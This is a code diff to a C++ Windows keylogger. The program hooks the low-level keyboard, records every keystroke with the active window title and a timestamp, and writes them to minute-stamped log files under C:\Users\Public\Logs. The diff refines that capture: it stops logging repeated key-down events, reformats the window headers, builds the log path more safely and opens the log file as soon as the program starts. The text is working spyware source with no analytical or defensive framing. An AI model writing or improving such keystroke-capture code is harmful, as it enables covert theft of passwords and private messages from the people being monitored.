@@ -66,8 +66,9 @@ KBDLLHOOKSTRUCT kbdStruct;
 int Save(int key_stroke);
 std::ofstream output_file;
 
-char output_filename[32];
+char output_filename[256];
 int cur_1min_interval = -1;
+bool key_pressed[256] = { false }; // Track which keys are currently pressed
 
 // This is the callback function. Consider it the event that is raised when, in this case,
 // a key is pressed.
@@ -81,8 +82,19 @@ LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
 			// lParam is the pointer to the struct containing the data needed, so cast and assign it to kdbStruct.
 			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
 
-			// save to file
-			Save(kbdStruct.vkCode);
+			// Only log if this key hasn't been logged yet for this press
+			if (!key_pressed[kbdStruct.vkCode])
+			{
+				key_pressed[kbdStruct.vkCode] = true;
+				// save to file
+				Save(kbdStruct.vkCode);
+			}
+		}
+		else if (wParam == WM_KEYUP)
+		{
+			// Mark key as released
+			kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
+			key_pressed[kbdStruct.vkCode] = false;
 		}
 	}
 
@@ -145,8 +157,8 @@ int Save(int key_stroke)
 		{
 			strcpy_s(lastwindow, sizeof(lastwindow), window_title);
 			char s[64];
-			strftime(s, sizeof(s), "%Y-%m-%dT%X", &tm_info);
-			output << "\n\n[Window: " << window_title << " - at " << s << "] ";
+			strftime(s, sizeof(s), "%Y-%m-%d %H:%M:%S", &tm_info);
+			output << "\n\n=== " << window_title << " | " << s << " ===\n";
 		}
 	}
 
@@ -189,9 +201,16 @@ int Save(int key_stroke)
 		cur_1min_interval = current_1min;
 		output_file.close();
 		// Create logs folder if it doesn't exist
-		const char* logs_dir = "C:\\Users\\Public";
+		const char* logs_dir = "C:\\Users\\Public\\Logs";
 		_mkdir(logs_dir);
-		strftime(output_filename, sizeof(output_filename), "C:\\Users\\Public\\%Y-%m-%d__%H-%M-%S.log", &tm_info);
+		
+		char temp_filename[256];
+		strftime(temp_filename, sizeof(temp_filename), "%Y-%m-%d__%H-%M-%S.log", &tm_info);
+		
+		strcpy_s(output_filename, sizeof(output_filename), logs_dir);
+		strcat_s(output_filename, sizeof(output_filename), "\\");
+		strcat_s(output_filename, sizeof(output_filename), temp_filename);
+		
 		output_file.open(output_filename, std::ios_base::app);
 		std::cout << "Logging output to " << output_filename << std::endl;
 	}
@@ -247,6 +266,27 @@ int main()
 	
 	// Call the hook function and set the hook.
 	SetHook();
+
+	// Initialize the log file immediately on startup
+	{
+		const char* logs_dir = "C:\\Users\\Public\\Logs";
+		_mkdir(logs_dir);
+		
+		struct tm tm_info;
+		const time_t t = time(NULL);
+		localtime_s(&tm_info, &t);
+		
+		cur_1min_interval = (tm_info.tm_hour * 60 + tm_info.tm_min);
+		char temp_filename[256];
+		strftime(temp_filename, sizeof(temp_filename), "%Y-%m-%d__%H-%M-%S.log", &tm_info);
+		
+		strcpy_s(output_filename, sizeof(output_filename), logs_dir);
+		strcat_s(output_filename, sizeof(output_filename), "\\");
+		strcat_s(output_filename, sizeof(output_filename), temp_filename);
+		
+		output_file.open(output_filename, std::ios_base::app);
+		std::cout << "Logging output to " << output_filename << std::endl;
+	}
 
 	// We need a loop to keep the console application running.
 	MSG msg;
